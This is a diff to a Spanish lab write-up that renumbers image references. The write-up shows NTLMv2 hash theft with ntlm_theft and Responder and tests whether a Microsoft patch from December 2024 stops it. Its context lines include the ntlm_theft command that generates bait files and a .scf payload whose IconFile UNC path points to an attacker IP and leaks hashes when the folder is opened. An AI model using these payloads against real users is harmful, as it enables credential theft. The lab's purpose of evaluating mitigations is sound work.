@@ -4,12 +4,12 @@ author: 1
 date: 2024-11-03
 categories: [Cybersecurity, NTLM]
 tags: [Hashes, Responder, Windows]
-image: /assets/img/tareas/NTLM.jpg
+image: /assets/img/tareas/NTLMv2/NTLM.jpg
 ---
 
 Demostrar de manera práctica el funcionamiento del robo de hashes NTLMv2, mediante el uso de archivos modificados. Además, evaluaremos la efectividad del parche de seguridad lanzado por Microsoft en diciembre de 2024 para mitigar esta vulnerabilidad.
 
-![Figura 1](/assets/img/tareas/NTLMv2/NTLM.jpg)
+![Figura 1](/assets/img/tareas/NTLMv2/1.png)
 
 ## Herramientas Utilizadas
 
@@ -21,7 +21,7 @@ Uso básico:
 python3 ntlm_theft.py -g modern -s 192.168.1.11 -f Important
 ```
 
-![Figura 2](/assets/img/tareas/NTLMv2/1.png)
+![Figura 2](/assets/img/tareas/NTLMv2/2.png)
 
 ## Archivos Generados
 
@@ -42,21 +42,21 @@ Important.pdf
 
 Compartimos el archivo Excel con la máquina víctima y ejecutamos **Responder** en la máquina atacante.
 
-![Figura 3](/assets/img/tareas/NTLMv2/2.png)
+![Figura 3](/assets/img/tareas/NTLMv2/3.png)
 
-![Figura 4](/assets/img/tareas/NTLMv2/3.png)
+![Figura 4](/assets/img/tareas/NTLMv2/4.png)
 
-![Figura 5](/assets/img/tareas/NTLMv2/4.png)
+![Figura 5](/assets/img/tareas/NTLMv2/5.png)
 
 ## Aplicación del Parche
 
 Se aplicó el parche lanzado por Microsoft en diciembre de 2024 para Windows 10.
 
-![Figura 6](/assets/img/tareas/NTLMv2/5.png)
+![Figura 6](/assets/img/tareas/NTLMv2/6.png)
 
 Al probar nuevamente, la vulnerabilidad persiste al abrir el archivo Excel.
 
-![Figura 7](/assets/img/tareas/NTLMv2/6.png)
+![Figura 7](/assets/img/tareas/NTLMv2/7.png)
 
 ## Windows Server 2016
 
@@ -70,21 +70,21 @@ IconFile=\\192.168.1.11\tools\nc.ico
 Command=ToggleDesktop
 ```
 
-![Figura 8](/assets/img/tareas/NTLMv2/7.png)
+![Figura 8](/assets/img/tareas/NTLMv2/8.png)
 
 Simplemente al acceder a la ruta del archivo, se capturan los hashes correspondientes.
 
-![Figura 9](/assets/img/tareas/NTLMv2/8.png)
+![Figura 9](/assets/img/tareas/NTLMv2/9.png)
 
-![Figura 10](/assets/img/tareas/NTLMv2/9.png)
+![Figura 10](/assets/img/tareas/NTLMv2/10.png)
 
 ## Instalación del Parche
 
 Al intentar instalar manualmente el parche, se detecta que no es aplicable a Windows Server 2016.
 
-![Figura 11](/assets/img/tareas/NTLMv2/10.png)
+![Figura 11](/assets/img/tareas/NTLMv2/11.png)
 
-![Figura 12](/assets/img/tareas/NTLMv2/11.png)
+![Figura 12](/assets/img/tareas/NTLMv2/12.png)
 
 ## Conclusión del Laboratorio
 
@@ -95,9 +95,9 @@ Este laboratorio demostró que:
 
 Esto resalta la importancia de evaluar constantemente las mitigaciones en entornos vulnerables.
 
-![Figura 13](/assets/img/tareas/NTLMv2/12.png)
+![Figura 13](/assets/img/tareas/NTLMv2/13.png)
 
-![Figura 14](/assets/img/tareas/NTLMv2/13.png)
+![Figura 14](/assets/img/tareas/NTLMv2/14.png)
 
-![Figura 15](/assets/img/tareas/NTLMv2/14.png)
+![Figura 15](/assets/img/tareas/NTLMv2/15.png)
 
